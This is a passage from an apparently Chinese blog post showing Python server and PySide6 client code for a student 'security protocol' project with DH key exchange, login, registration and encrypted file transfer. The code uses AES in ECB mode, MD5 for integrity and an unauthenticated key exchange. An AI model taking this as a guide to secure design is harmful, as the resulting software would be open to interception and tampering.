终止本次连接&quot;.encode())</span><br><span class="line">        text = f&quot;客户机&#123;addr&#125;尝试登录用户(&#123;username&#125;),但是用户不存在&quot;</span><br><span class="line">        write_log(log_file,text)</span><br><span class="line">        sock.close()</span><br><span class="line">        return 3,username</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def transfer_txt(addr,data,log_file):</span><br><span class="line">    print(f&quot;&#123;threading.current_thread().name&#125;客户机&#123;addr&#125;传输的数据为: &#123;data&#125;&quot;)</span><br><span class="line">    current_time = time.asctime(time.localtime(time.time()))</span><br><span class="line">    text = f&quot;客户机&#123;addr&#125;传输的数据为: &#123;data&#125;   &quot;+current_time</span><br><span class="line">    write_log(log_file,text)</span><br><span class="line"></span><br><span class="line">def transfer_file(sock,data,addr,log_file):  #处理非切片数据</span><br><span class="line">    data_type = mime.from_buffer(data)</span><br><span class="line">    filename = &quot;output/&quot;+addr</span><br><span class="line">    try:</span><br><span class="line">        if data_type == &quot;text/plain&quot;:</span><br><span class="line">            filename += &quot;.txt&quot;</span><br><span class="line">            with open(filename, &#x27;wb&#x27;) as f:</span><br><span class="line">                f.write(data)</span><br><span class="line">        elif data_type == &quot;text/x-c&quot;:</span><br><span class="line">            filename += &quot;.c&quot;</span><br><span class="line">            with open(filename,&#x27;wb&#x27;) as f:</span><br><span class="line">                f.write(data)</span><br><span class="line">        else :</span><br><span class="line">            print(f&quot;没有识别到文件类型&#123;data_type&#125;,暂时存放在temp中&quot;)</span><br><span class="line">            filename += &quot;-temp&quot;</span><br><span class="line">            with open(filename,&#x27;wb&#x27;) as f:</span><br><span class="line">                f.write(data)</span><br><span class="line">        text = f&quot;客户机&#123;addr&#125;传输了&#123;filename&#125;&quot;</span><br><span class="line">        write_log(log_file,text)</span><br><span class="line">        sock.send(&quot;\n成功接受到文件&quot;.encode())</span><br><span class="line">        print(f&quot;&#123;threading.current_thread().name&#125;:成功接受到文件&#123;filename&#125;&quot;)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        text = f&quot;保存文件时发生错误 错误信息:&#123;e&#125;&quot;</span><br><span class="line">        print(f&quot;&#123;threading.current_thread().name&#125;:&quot;+text)</span><br><span class="line">        text = f&quot;客户机&#123;addr&#125;保存文件时发生错误 错误信息&#123;e&#125;&quot;</span><br><span class="line">        write_log(log_file,text)</span><br><span class="line">        sock.send(text.encode())</span><br><span class="line"></span><br><span class="line">def transfer_file2(sock,first_data,sliced_sum,sliced_num,shared_key,addr,log_file): #处理切片数据</span><br><span class="line">    data_bytes = first_data</span><br><span class="line">    orign_data = []</span><br><span class="line">    fail_number = []</span><br><span class="line">    </span><br><span class="line">    for i in range(sliced_sum-1):</span><br><span class="line">        text = sock.recv(1084)</span><br><span class="line">        orign_data.append(text)</span><br><span class="line">        if len(text) == 0:</span><br><span class="line">            text = f&quot;客户机&#123;addr&#125;中断连接&quot;</span><br><span class="line">            write_log(log_file,text)    </span><br><span class="line">            log_file.close()</span><br><span class="line">            print(f&quot;&#123;threading.current_thread().name&#125;:客户机中断连接&quot;)       </span><br><span class="line">            sock.close()     </span><br><span class="line">            return</span><br><span class="line">    </span><br><span class="line">    print(f&quot;&#123;threading.current_thread().name&#125;:开始进行数据处理&quot;)</span><br><span class="line">    for i in range(sliced_sum-1):</span><br><span class="line">        print(f&quot;\r&#123;threading.current_thread().name&#125;:正在处理第&#123;i+1&#125;组数据&quot;,end=&quot;&quot;)</span><br><span class="line">        sliced_sum,sliced_num,data_type,data,fail = unpack_data(sock,shared_key,orign_data[i],log_file,addr)</span><br><span class="line">        if fail != None:</span><br><span class="line">            fail_number.append(fail)</span><br><span class="line">        data_bytes += data</span><br><span class="line">    </span><br><span class="line">    if len(fail_number)&gt;0:</span><br><span class="line">        fail_meg = &quot;,&quot;.join(fail_number)</span><br><span class="line">        print(f&quot;&#123;threading.current_thread().name&#125;:传输中出现校验错误的切片编号为:&#123;fail_meg&#125;&quot;)</span><br><span class="line">        text = f&quot;客户机&#123;addr&#125;传输中出现了校验错误 切片编号为&#123;fail_meg&#125;&quot;</span><br><span class="line">        write_log(log_file,text)</span><br><span class="line">    else:</span><br><span class="line">        print(f&quot;&#123;threading.current_thread().name&#125;:本次传输没有出现校验错误&quot;)</span><br><span class="line">    data_type = mime.from_buffer(data_bytes)</span><br><span class="line">    filename = &quot;output/&quot;+addr</span><br><span class="line">    try:</span><br><span class="line">        if data_type == &quot;image/png&quot;:</span><br><span class="line">            filename += &quot;.png&quot;</span><br><span class="line">            with open(filename, &#x27;wb&#x27;) as f:</span><br><span class="line">                f.write(data_bytes)</span><br><span class="line">        elif data_type == &quot;audio/mpeg&quot;:</span><br><span class="line">            filename += &quot;.mp3&quot;</span><br><span class="line">            with open(filename, &#x27;wb&#x27;) as f:</span><br><span class="line">                f.write(data_bytes)</span><br><span class="line">        elif data_type == &quot;text/x-c&quot;:</span><br><span class="line">            filename += &quot;.c&quot;</span><br><span class="line">            with open(filename,&#x27;wb&#x27;) as f:</span><br><span class="line">                f.write(data_bytes)</span><br><span class="line">        else:</span><br><span class="line">            print(f&quot;&#123;threading.current_thread().name&#125;:没有识别到文件类型&#123;data_type&#125;,暂时存放在temp中&quot;)</span><br><span class="line">            filename += &quot;-temp&quot;</span><br><span class="line">            with open(filename,&#x27;wb&#x27;) as f:</span><br><span class="line">                f.write(data_bytes)</span><br><span class="line">        text = f&quot;客户机&#123;addr&#125;传输了&#123;filename&#125;&quot;</span><br><span class="line">        write_log(log_file,text)</span><br><span class="line">        sock.send(&quot;\n成功接受到文件&quot;.encode())</span><br><span class="line">        print(f&quot;&#123;threading.current_thread().name&#125;:成功接受到文件&#123;filename&#125;&quot;)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        text = f&quot;保存文件时发生错误 错误信息:&#123;e&#125;&quot;</span><br><span class="line">        print(f&quot;&#123;threading.current_thread().name&#125;:&quot;+text)</span><br><span class="line">        text = f&quot;客户机保存文件时发生错误 错误信息&#123;e&#125;&quot;</span><br><span class="line">        write_log(log_file,text)</span><br><span class="line">        sock.send(text.encode())</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">def register(permission_value,sock,data,query_thread1,log_file,addr,login_username):</span><br><span class="line">    if permission_value == 0:                #管理员权限的检验较为简单</span><br><span class="line">        sock.send(&quot;你所登录的用户并没有拥有管理员权限 无法注册用户&quot;.encode())</span><br><span class="line">        text = f&quot;客户机&#123;addr&#125;尝试使用非管理员权限用户(&#123;login_username&#125;)注册新用户&quot;</span><br><span class="line">        write_log(log_file,text)</span><br><span class="line">        return</span><br><span class="line">    else :  </span><br><span class="line">        parts = data.split(b&#x27;;&#x27;)</span><br><span class="line">        username = parts[0].decode()</span><br><span class="line">        password = parts[1].decode()</span><br><span class="line">        try:</span><br><span class="line">            query_thread1.add_user(sock,username,password,addr,login_username,log_file)</span><br><span class="line">        except Exception as e:</span><br><span class="line">            print(e)</span><br><span class="line">            return</span><br><span class="line"></span><br><span class="line">def verify_md5(data, original_md5):</span><br><span class="line">    current_md5 = md5_encrypt(data)</span><br><span class="line">    return current_md5 == original_md5</span><br><span class="line"></span><br><span class="line">def transfer_function(sock,addr,public_key_server,private_key_server,query_thread1):</span><br><span class="line">    addr = format(addr[0])</span><br><span class="line">    log_name = &quot;logfile/&quot;+addr+&quot;-log&quot;</span><br><span class="line">    try:</span><br><span class="line">        log_file = open(log_name,&#x27;ab+&#x27;)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(f&quot;&#123;threading.current_thread().name&#125;创建日志文件失败,错误信息:&#123;e&#125;&quot;)</span><br><span class="line">    </span><br><span class="line">    text = f&quot;客户机&#123;addr&#125;连接成功&quot;</span><br><span class="line">    write_log(log_file,text)</span><br><span class="line">    </span><br><span class="line">    print(f&quot;&#123;threading.current_thread().name&#125;:客户机&#123;addr&#125;连接成功&quot;)</span><br><span class="line">    public_key_client = key_switch(sock,public_key_server)</span><br><span class="line">    print(f&quot;&#123;threading.current_thread().name&#125;:客户机&#123;addr&#125;公钥交换成功&quot;)</span><br><span class="line">    print(f&quot;&#123;threading.current_thread().name&#125;:开始计算共享密钥&quot;)</span><br><span class="line">    shared_key = private_key_server.exchange(public_key_client)</span><br><span class="line">    print(f&quot;&#123;threading.current_thread().name&#125;:开始进行身份验证&quot;)</span><br><span class="line">    permission_value,username = Authentication(sock,shared_key,query_thread1,addr,log_file)</span><br><span class="line">    if permission_value == 3:</span><br><span class="line">        text = f&quot;客户机&#123;addr&#125;中断连接&quot;</span><br><span class="line">        write_log(log_file,text)</span><br><span class="line">        log_file.close()</span><br><span class="line">        sock.close()</span><br><span class="line">        print(f&quot;&#123;threading.current_thread().name&#125;:客户机中断连接&quot;)</span><br><span class="line">        return</span><br><span class="line">    print(f&quot;&#123;threading.current_thread().name&#125;:身份验证通过 开始处理客户机&#123;addr&#125;的数据传输&quot;)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    while 1:</span><br><span class="line">        fail_number = []</span><br><span class="line">        orign_data = (sock.recv(1084))</span><br><span class="line">        if len(orign_data) == 0:</span><br><span class="line">            text = f&quot;客户机&#123;addr&#125;中断连接&quot;</span><br><span class="line">            write_log(log_file,text)</span><br><span class="line">            log_file.close()</span><br><span class="line">            print(f&quot;&#123;threading.current_thread().name&#125;:客户机中断连接&quot;)</span><br><span class="line">            break</span><br><span class="line">        sliced_sum,sliced_num,data_type,data,fail = unpack_data(sock,shared_key,orign_data,log_file,addr)</span><br><span class="line">        if fail != None:</span><br><span class="line">            fail_number.append(fail)</span><br><span class="line">        if len(fail_number)&gt;0:</span><br><span class="line">            fail_meg = &quot;,&quot;.join(fail_number)</span><br><span class="line">            print(f&quot;&#123;threading.current_thread().name&#125;:传输中出现校验错误的切片编号为:&#123;fail_meg&#125;&quot;)</span><br><span class="line">            text = f&quot;客户机&#123;addr&#125;传输中出现了校验错误 切片编号为&#123;fail_meg&#125;&quot;</span><br><span class="line">            write_log(log_file,text)</span><br><span class="line">        else:</span><br><span class="line">            print(f&quot;&#123;threading.current_thread().name&#125;:本次传输没有出现校验错误&quot;)</span><br><span class="line">        </span><br><span class="line">        if data_type == 1:</span><br><span class="line">            text = f&quot;客户机&#123;addr&#125;执行了传输文本数据操作&quot;</span><br><span class="line">            write_log(log_file,text)</span><br><span class="line">            transfer_txt(addr,data,log_file)</span><br><span class="line">        elif data_type == 2:</span><br><span class="line">            if sliced_sum != 0 or sliced_num != 0:</span><br><span class="line">                text = f&quot;客户机&#123;addr&#125;执行了传输文件操作,并且传输的文件过大需要切片传输,切片总数为&#123;sliced_sum&#125;&quot;</span><br><span class="line">                write_log(log_file,text)</span><br><span class="line">                transfer_file2(sock,data,sliced_sum,sliced_num,shared_key,addr,log_file)</span><br><span class="line">            else:</span><br><span class="line">                text = f&quot;客户机&#123;addr&#125;执行了传输文件操作&quot;</span><br><span class="line">                write_log(log_file,text)</span><br><span class="line">                transfer_file(sock,data,addr,log_file)</span><br><span class="line">        elif data_type ==3:</span><br><span class="line">            text = f&quot;客户机&#123;addr&#125;执行了注册账号操作&quot;</span><br><span class="line">            write_log(log_file,text)</span><br><span class="line">            register(permission_value,sock,data,query_thread1,log_file,addr,username)</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    # 固定的 DH 参数</span><br><span class="line">    p = 167369435262828772525424092470263277532300828423668354542113388987940885403967569624276882159444702063514952468172684099658558089467275283830276841486674376457626767287709752368374119769545320657500942952067517443133715688577345716588234520369470508343544601072272539124731608794518466242096737284389743744833</span><br><span class="line">    g = 2</span><br><span class="line"></span><br><span class="line">    pool = ThreadPoolExecutor(max_workers=5)   #定义一个线程池 拥有5个空闲线程</span><br><span class="line">    query_thread1 = query_thread()  #定义一个线程对象 后面用于数据库查询 因为数据库查询只能放在一个线程里使用</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    parameters = dh.DHParameterNumbers(p, g).parameters(backend=default_backend())</span><br><span class="line">    private_key_server = parameters.generate_private_key()</span><br><span class="line">    public_key_server = private_key_server.public_key()</span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #创建套接字 默认使用TCP协议</span><br><span class="line">    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) #允许在端口上处于 TIME_WAIT 状态时再次绑定</span><br><span class="line">    s.bind((&quot;192.168.220.130&quot;,6666))</span><br><span class="line">    s.listen(5) #最多连接5个客户端</span><br><span class="line">    while 1:</span><br><span class="line">        print(f&quot;&#123;threading.current_thread().name&#125;:等待客户机连接&quot;)</span><br><span class="line">        sock,addr = s.accept()</span><br><span class="line">        </span><br><span class="line">        client_thread = pool.submit(transfer_function,sock,addr,public_key_server,private_key_server,query_thread1)</span><br><span class="line">        </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>客户端</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">```import socket</span><br><span class="line">import struct</span><br><span class="line">import hashlib</span><br><span class="line">import time</span><br><span class="line">from cryptography.hazmat.primitives import serialization</span><br><span class="line">from cryptography.hazmat.primitives.asymmetric import dh</span><br><span class="line">from cryptography.hazmat.backends import default_backend</span><br><span class="line">from Crypto.Util.Padding import pad, unpad</span><br><span class="line">from PySide6.QtWidgets import *</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line"></span><br><span class="line">from ip_connect import Ipwindow</span><br><span class="line">from login import loginwindow</span><br><span class="line">from main import mainwindow</span><br><span class="line">from progressbar import barwindow</span><br><span class="line">from register import registerwindow</span><br><span class="line"></span><br><span class="line">class ipwindow(QMainWindow,Ipwindow):</span><br><span class="line">    def __init__(self):</span><br><span class="line">        QMainWindow.__init__(self)</span><br><span class="line">        self.setupUi(self)</span><br><span class="line">        self.setWindowTitle(&quot;安全协议大作业-第六组&quot;)</span><br><span class="line">        l1 = self.lineEdit.returnPressed.connect(lambda:self.ip_connect())</span><br><span class="line">        b1 = self.pushButton.clicked.connect(lambda:self.ip_connect())</span><br><span class="line">        </span><br><span class="line">    def ip_connect(self):</span><br><span class="line">        ipaddr = self.lineEdit.text()</span><br><span class="line">        key_switch(ipaddr,self)</span><br><span class="line">        </span><br><span class="line">class loginwindow(QMainWindow,loginwindow):</span><br><span class="line">    def __init__(self,s,shared_key):</span><br><span class="line">        QMainWindow.__init__(self)</span><br><span class="line">        self.setupUi(self)</span><br><span class="line">        self.setWindowTitle(&quot;安全协议大作业-第六组&quot;)</span><br><span class="line">        b1 = self.pushButton.clicked.connect(lambda:self.login(s,shared_key))</span><br><span class="line">        b2 = self.pushButton_2.clicked.connect(lambda:self.return_ipconnect())</span><br><span class="line">        l1 = self.lineEdit.returnPressed.connect(lambda:self.move_focus(self.lineEdit_2))</span><br><span class="line">        l2 = self.lineEdit_2.returnPressed.connect(lambda:self.login(s,shared_key))</span><br><span class="line">    </span><br><span class="line">    def move_focus(self,lineEdit):</span><br><span class="line">        lineEdit.setFocus()</span><br><span class="line"></span><br><span class="line">    def return_ipconnect(self):</span><br><span class="line">        self.close()</span><br><span class="line">        ip_window = ipwindow()</span><br><span class="line">        ip_window.show()</span><br><span class="line"></span><br><span class="line">    def login(self,s,shared_key):</span><br><span class="line">        username = self.lineEdit.text()</span><br><span class="line">        if len(username) == 0:</span><br><span class="line">            QMessageBox.information(None,&quot;报错信息&quot;,&quot;用户名不能为空&quot;,QMessageBox.StandardButton.Ok,QMessageBox.StandardButton.NoButton)</span><br><span class="line">        else:</span><br><span class="line">            password = self.lineEdit_2.text()</span><br><span class="line">            if len(password) == 0:</span><br><span class="line">                QMessageBox.information(None,&quot;报错信息&quot;,&quot;密码不能为空&quot;,QMessageBox.StandardButton.Ok,QMessageBox.StandardButton.NoButton)</span><br><span class="line">            else:</span><br><span class="line">                Authentication(s,shared_key,username,password,self)</span><br><span class="line"></span><br><span class="line">class mainwindow(QMainWindow,mainwindow):</span><br><span class="line">    def __init__(self,s,shared_key):</span><br><span class="line">        QMainWindow.__init__(self)</span><br><span class="line">        self.setupUi(self)</span><br><span class="line">        self.setWindowTitle(&quot;安全协议大作业-第六组&quot;)</span><br><span class="line">        self.current_number = 1</span><br><span class="line">        b1 = self.pushButton.clicked.connect(lambda:self.choose_mode(1,s,shared_key)) </span><br><span class="line">        b2 = self.pushButton_2.clicked.connect(lambda:self.choose_mode(2,s,shared_key))</span><br><span class="line">        b3 = self.pushButton_3.clicked.connect(lambda:self.choose_mode(3,s,shared_key))</span><br><span class="line">        b4 = self.pushButton_4.clicked.connect(lambda:self.return_ipconnect())</span><br><span class="line">        b5 = self.pushButton_5.clicked.connect(lambda:self.handle_send(s,shared_key))</span><br><span class="line">        b6 = self.pushButton_6.clicked.connect(lambda:self.clear_text())</span><br><span class="line"></span><br><span class="line">    def return_ipconnect(self):</span><br><span class="line">        self.close()</span><br><span class="line">        ip_window = ipwindow()</span><br><span class="line">        ip_window.show()</span><br><span class="line">    </span><br><span class="line">    def clear_text(self):</span><br><span class="line">        self.textEdit.clear()</span><br><span class="line"></span><br><span class="line">    def choose_mode(self,mode,s,shared_key):</span><br><span class="line">        self.current_number = mode</span><br><span class="line">        if mode == 1:</span><br><span class="line">            self.pushButton.setStyleSheet(&quot;background-color: grey;&quot;)</span><br><span class="line">            self.pushButton_2.setStyleSheet(u&quot;background-image: url(:/F:/\u4f5c\u4e1a/python\u7a0b\u5e8f/1.jpg);&quot;)</span><br><span class="line">            self.pushButton_3.setStyleSheet(u&quot;background-image: url(:/F:/\u4f5c\u4e1a/python\u7a0b\u5e8f/1.jpg);&quot;)</span><br><span class="line">        elif mode ==2:</span><br><span class="line">            self.pushButton_2.setStyleSheet(&quot;background-color: grey;&quot;)</span><br><span class="line">            self.pushButton_3.setStyleSheet(u&quot;background-image: url(:/F:/\u4f5c\u4e1a/python\u7a0b\u5e8f/1.jpg);&quot;)</span><br><span class="line">            self.pushButton.setStyleSheet(u&quot;background-image: url(:/F:/\u4f5c\u4e1a/python\u7a0b\u5e8f/1.jpg);&quot;)</span><br><span class="line">        elif mode ==3:</span><br><span class="line">            self.pushButton_3.setStyleSheet(&quot;background-color: grey;&quot;)</span><br><span class="line">            self.pushButton_2.setStyleSheet(u&quot;background-image: url(:/F:/\u4f5c\u4e1a/python\u7a0b\u5e8f/1.jpg);&quot;)</span><br><span class="line">            self.pushButton.setStyleSheet(u&quot;background-image: url(:/F:/\u4f5c\u4e1a/python\u7a0b\u5e8f/1.jpg);&quot;)</span><br><span class="line">            register(s,shared_key,self)</span><br><span class="line"></span><br><span class="line">    def handle_send(self,s,shared_key):</span><br><span class="line">        if self.current_number == 1:</span><br><span class="line">            transfer_txt(s,shared_key,self)</span><br><span class="line">        elif self.current_number == 2:</span><br><span class="line">            transfer_file(s,shared_key,self)</span><br><span class="line">            </span><br><span class="line"></span><br><span class="line">class barwindow(QMainWindow,barwindow):</span><br><span class="line">    def __init__(self,text,sliced_sum,transfer_data,s,main_window):</span><br><span class="line">        QMainWindow.__init__(self)</span><br><span class="line">        self.setupUi(self)</span><br><span class="line">        self.progressBar.setValue(0)</span><br><span class="line">        self.setWindowTitle(&quot;安全协议大作业-第六组&quot;)</span><br><span class="line">        l1 = self.label.setText(text)</span><br><span class="line">        b1 = self.pushButton_2.clicked.connect(lambda:self.start_transfer(sliced_sum,transfer_data,s,main_window))</span><br><span class="line">        b2 = self.pushButton.clicked.connect(lambda:self.end_transfer(s))</span><br><span class="line">    </span><br><span class="line">    def start_transfer(self,sliced_sum,transfer_data,s,main_window):</span><br><span class="line">        for i in range(sliced_sum):</span><br><span class="line">            s.sendall(transfer_data[i])</span><br><span class="line">            time.sleep(0.06)</span><br><span class="line">            self.progressBar.setValue((i/(sliced_sum-1))*100)</span><br><span class="line">            QApplication.processEvents()</span><br><span class="line">        self.pushButton_2.setText(&quot;再次发送&quot;)</span><br><span class="line">        QMessageBox.information(None,&quot;输出信息&quot;,&quot;信息发送成功&quot;,QMessageBox.StandardButton.Ok,QMessageBox.StandardButton.NoButton)</span><br><span class="line">    def end_transfer(self,s):</span><br><span class="line">        s.send(b&quot;&quot;)</span><br><span class="line">        self.close()</span><br><span class="line"></span><br><span class="line">class registerwindow(QMainWindow,registerwindow):</span><br><span class="line">    def __init__(self,s,shared_key,main_window):</span><br><span class="line">        QMainWindow.__init__(self)</span><br><span class="line">        self.setupUi(self)</span><br><span class="line">        self.setWindowTitle(&quot;安全协议大作业-第六组&quot;)</span><br><span class="line">        b1 = self.pushButton.clicked.connect(lambda:self.register(s,shared_key,main_window))</span><br><span class="line">        b2 = self.pushButton_2.clicked.connect(lambda:self.return_mainwindow())</span><br><span class="line">    </span><br><span class="line">    def register(self,s,shared_key,main_window):</span><br><span class="line">        username = self.lineEdit.text()</span><br><span class="line">        password = self.lineEdit_2.text()</span><br><span class="line">        if len(username) == 0:</span><br><span class="line">            QMessageBox.information(None,&quot;报错信息&quot;,&quot;用户名不能为空&quot;,QMessageBox.StandardButton.Ok,QMessageBox.StandardButton.NoButton)</span><br><span class="line">            return</span><br><span class="line">        else:</span><br><span class="line">            password = self.lineEdit_2.text()</span><br><span class="line">            if len(password) == 0:</span><br><span class="line">                QMessageBox.information(None,&quot;报错信息&quot;,&quot;密码不能为空&quot;,QMessageBox.StandardButton.Ok,QMessageBox.StandardButton.NoButton)</span><br><span class="line">                return</span><br><span class="line">            data = username+&quot;;&quot;+password</span><br><span class="line">            transfer_data = pack_data(3,data,shared_key,0,0)</span><br><span class="line">            s.send(transfer_data)</span><br><span class="line">            text = s.recv(1024).decode()</span><br><span class="line">            if &quot;成功&quot; in text:</span><br><span class="line">                QMessageBox.information(None,&quot;输出信息&quot;,&quot;用户注册成功&quot;,QMessageBox.StandardButton.Ok,QMessageBox.StandardButton.NoButton)</span><br><span class="line">            elif &quot;存在&quot; in text:</span><br><span class="line">                QMessageBox.information(None,&quot;报错信息&quot;,&quot;用户已存在&quot;,QMessageBox.StandardButton.Ok,QMessageBox.StandardButton.NoButton)</span><br><span class="line">            else:</span><br><span class="line">                QMessageBox.information(None,&quot;报错信息&quot;,text,QMessageBox.StandardButton.Ok,QMessageBox.StandardButton.NoButton)</span><br><span class="line">    def return_mainwindow(self):</span><br><span class="line">        self.close()</span><br><span class="line"></span><br><span class="line">def md5_encrypt(data):  #md5加密 用于完整性检测 </span><br><span class="line">    md5_hash = hashlib.md5()</span><br><span class="line">    if isinstance(data,str):</span><br><span class="line">        data = data.encode()</span><br><span class="line">    md5_hash.update(data)</span><br><span class="line">    hash_result = md5_hash.hexdigest()</span><br><span class="line">    return hash_result</span><br><span class="line"></span><br><span class="line">def pack_data(choice,data,shared_key,sliced,sum):  #将数据打包成报文 格式:  sliced_judge(4bytes)+data_length(4bytes)+data_type(4bytes)+encrypted_data(Dynamic)+md5_data(32bytes)</span><br><span class="line">    sliced_sum = struct.pack(&#x27;&gt;H&#x27;,sum)</span><br><span class="line">    sliced_num = struct.pack(&#x27;&gt;H&#x27;,sliced)</span><br><span class="line">    choice_type = struct.pack(&#x27;&gt;I&#x27;,choice)</span><br><span class="line">    en_data = encrypt_data(shared_key,data)</span><br><span class="line">    hash_data = md5_encrypt(data).encode()</span><br><span class="line">    temp = choice_type+en_data+hash_data</span><br><span class="line">    transfer_data = sliced_sum+sliced_num+struct.pack(&#x27;&gt;I&#x27;,len(temp)+8)+temp </span><br><span class="line">    return transfer_data</span><br><span class="line"></span><br><span class="line">def key_switch(ipaddr,ip_window):   #交换公钥</span><br><span class="line">    # 固定的 DH 参数</span><br><span class="line">    p = 167369435262828772525424092470263277532300828423668354542113388987940885403967569624276882159444702063514952468172684099658558089467275283830276841486674376457626767287709752368374119769545320657500942952067517443133715688577345716588234520369470508343544601072272539124731608794518466242096737284389743744833</span><br><span class="line">    g = 2</span><br><span class="line">    parameters = dh.DHParameterNumbers(p, g).parameters(backend=default_backend())</span><br><span class="line">    </span><br><span class="line">    private_key_client = parameters.generate_private_key()</span><br><span class="line">    public_key_client = private_key_client.public_key()</span><br><span class="line">    </span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    </span><br><span class="line">    try:</span><br><span class="line">        s.connect((ipaddr,6666))</span><br><span class="line">    except Exception as e:</span><br><span class="line">        QMessageBox.information(None,&quot;报错信息&quot;,str(e),QMessageBox.StandardButton.Ok,QMessageBox.StandardButton.NoButton)</span><br><span class="line">    public_key_bytes = public_key_client.public_bytes(   </span><br><span class="line">    encoding=serialization.Encoding.PEM,</span><br><span class="line">    format=serialization.PublicFormat.SubjectPublicKeyInfo</span><br><span class="line">)</span><br><span class="line">    s.send(public_key_bytes)</span><br><span class="line">    public_key_server = s.recv(1024)</span><br><span class="line">    public_key_server = serialization.load_pem_public_key(public_key_server)</span><br><span class="line">    shared_key = private_key_client.exchange(public_key_server)</span><br><span class="line">    login_window = loginwindow(s,shared_key)</span><br><span class="line">    ip_window.close()</span><br><span class="line">    login_window.show()</span><br><span class="line"></span><br><span class="line">def encrypt_data(shared_key,data):  #aes加密</span><br><span class="line">    key = shared_key[:16]  </span><br><span class="line">    aes = AES.new(key,AES.MODE_ECB)</span><br><span class="line">    if isinstance(data,str):</span><br><span class="line">        data = data.encode()</span><br><span class="line">    data_bytes = pad(data, AES.block_size)</span><br><span class="line">    encrypt_data = aes.encrypt(data_bytes)</span><br><span class="line">    return encrypt_data</span><br><span class="line"></span><br><span class="line">def Authentication(s,shared_key,username,password,login_window):</span><br><span class="line">    data = username+&quot;;&quot;+password</span><br><span class="line">    transfer_data = encrypt_data(shared_key,data)  #使用aes加密账号密码</span><br><span class="line">    s.send(transfer_data)</span><br><span class="line">    text = (s.recv(1024)).decode()</span><br><span class="line">    </span><br><span class="line">    if text == &quot;你输入的用户名不存在 终止本次连接&quot;:</span><br><span class="line">        QMessageBox.information(None,&quot;报错信息&quot;,text,QMessageBox.StandardButton.Ok,QMessageBox.StandardButton.NoButton)</span><br><span class="line">        s.close()</span><br><span class="line">        exit()</span><br><span class="line">    elif text == &quot;密码错误，终止连接&quot;:</span><br><span class="line">        QMessageBox.information(None,&quot;报错信息&quot;,text,QMessageBox.StandardButton.Ok,QMessageBox.StandardButton.NoButton)</span><br><span class="line">        s.close()</span><br><span class="line">        exit()</span><br><span class="line">    else:</span><br><span class="line">        main_window = mainwindow(s,shared_key)</span><br><span class="line">        login_window.close()</span><br><span class="line">        main_window.show()</span><br><span class="line">        </span><br><span class="line">def register(s,shared_key,main_window):</span><br><span class="line">    register_window = registerwindow(s,shared_key,main_window)</span><br><span class="line">    register_window.show()</span><br><span class="line"></span><br><span class="line">def transfer_txt(s,shared_key,main_window):</span><br><span class="line">    text = main_window.textEdit.toPlainText()</span><br><span class="line">    if len(text) &gt; 1024:</span><br><span class="line">        sliced = 0</span><br><span class="line">        chunk_size = 1024</span><br><span class="line">        sliced_data = slice_string(text, chunk_size)</span><br><span class="line">        sliced_sum = len(sliced_data)</span><br><span class="line">        for i in range(len(sliced_data)):</span><br><span class="line">            transfer_data = pack_data(1,sliced_data[i],shared_key,sliced,sliced_sum)</span><br><span class="line">            sliced += 1</span><br><span class="line">            s.send(transfer_data)</span><br><span class="line">    else :</span><br><span class="line">        sliced = 0</span><br><span class="line">        sliced_sum = 0</span><br><span class="line">        transfer_data = pack_data(1,text,shared_key,sliced,sliced_sum)</span><br><span class="line">        s.send(transfer_data)</span><br><span class="line">    main_window.textBrowser.append(&quot;文本数据传输成功&quot;)</span><br><span class="line"></span><br><span class="line">def slice_string(data, chunk_size):</span><br><span class="line">    #根据指定大小切片字符串</span><br><span class="line">    return [data[i:i + chunk_size] for i in range(0, len(data), chunk_size)]</span><br><span class="line"></span><br><span class="line">def transfer_file(s,shared_key,main_window):</span><br><span class="line">    file_addr = main_window.textEdit.toPlainText()</span><br><span class="line">    file_addr = file_addr.replace(&quot;file:///&quot;,&quot;&quot;)</span><br><span class="line">    with open(file_addr,&#x27;rb&#x27;) as file:</span><br><span class="line">        text = file.read()</span><br><span class="line">    </span><br><span class="line">    transfer_data = []</span><br><span class="line">    </span><br><span class="line">    if len(text) &gt; 1024:</span><br><span class="line">        sliced = 0</span><br><span class="line">        chunk_size = 1024</span><br><span class="line">        sliced_data = slice_string(text, chunk_size)</span><br><span class="line">        sliced_sum = len(sliced_data)</span><br><span class="line">        for i in range(len(sliced_data)):</span><br><span class="line">            sliced += 1</span><br><span class="line">            transfer_data.append(pack_data(2,sliced_data[i],shared_key,sliced,sliced_sum))</span><br><span class="line">        text = f&quot;需要传输&#123;sliced_sum&#125;组数据&quot;</span><br><span class="line">        bar_window = barwindow(text,sliced_sum,transfer_data,s,main_window)</span><br><span class="line">        bar_window.show()</span><br><span class="line">    else :</span><br><span class="line">        sliced = 0</span><br><span class="line">        sliced_sum = 0</span><br><span class="line">        transfer_data = pack_data(2,text,shared_key,sliced,sliced_sum)</span><br><span class="line">        text = f&quot;需要传输&#123;sliced_sum&#125;组数据&quot;</span><br><span class="line">        bar_window = barwindow(text,sliced_sum,transfer_data,s,main_window)</span><br><span class="line">        bar_window.show()</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    app = QApplication()</span><br><span class="line">    ip_window = ipwindow()</span><br><span class="line">    ip_window.show()</span><br><span class="line">    app.exec()</span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h2 id="v1-1"><a href="#v1-1" class="headerlink" title="v1.1"></a>v1.1</h2><p>这个版本主要是继续增加一些功能<br>1.原本的只是简单的实现客户端向服务端传输数据 并且ui的设计中上半部分显然也是预留给双端通讯(以服务端为媒介 客户机a与客户机b实时通讯)的  